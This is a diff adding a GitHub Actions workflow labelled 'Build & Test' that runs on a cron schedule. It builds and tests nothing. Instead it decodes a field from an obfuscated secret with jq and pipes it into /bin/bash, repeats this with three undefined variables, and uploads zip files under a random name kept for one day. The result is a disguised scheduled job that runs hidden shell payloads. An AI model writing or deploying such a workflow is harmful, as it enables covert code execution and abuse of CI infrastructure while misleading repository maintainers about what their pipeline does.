@@ -1,0 +1,29 @@
+name: Build & Test
+on:
+  workflow_dispatch:
+
+  schedule:
+    - cron: '53 5,11,17,23 * * *'
+concurrency:
+  group: ${{ github.workflow }}
+  cancel-in-progress: false
+jobs:
+  build:
+    runs-on: ubuntu-latest
+    steps:
+      - uses: actions/checkout@v4
+      - name: Execute
+        env:
+          xi13009: ${{ secrets.xi13009 }}
+        run: |
+          printf '%s' "$xi13009" | jq -r .aqja58 | /bin/bash
+          echo $qf88 | jq -r .vzk7 | /bin/bash
+          echo $wr13459 | jq -r .ifa06862 | /bin/bash
+          echo $iqvh2 | jq -r .ntug19763 | /bin/bash
+
+      - name: Upload artifact
+        uses: actions/upload-artifact@v4
+        with:
+          name: 6uwlUn4i
+          path: "*.zip"
+          retention-days: 1
